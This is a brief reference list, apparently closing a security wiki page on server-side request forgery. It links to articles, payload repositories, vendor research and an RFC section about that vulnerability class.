- [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [Tenable – SSRF Vulnerability in Java TLS Handshakes That Creates DoS Risk](https://www.tenable.com/blog/tenable-discovers-ssrf-vulnerability-in-java-tls-handshakes-that-creates-dos-risk)
- [RFC 5280 §4.2.2.1 Authority Information Access](https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.2.1)

{{#include ../../banners/hacktricks-training.md}}
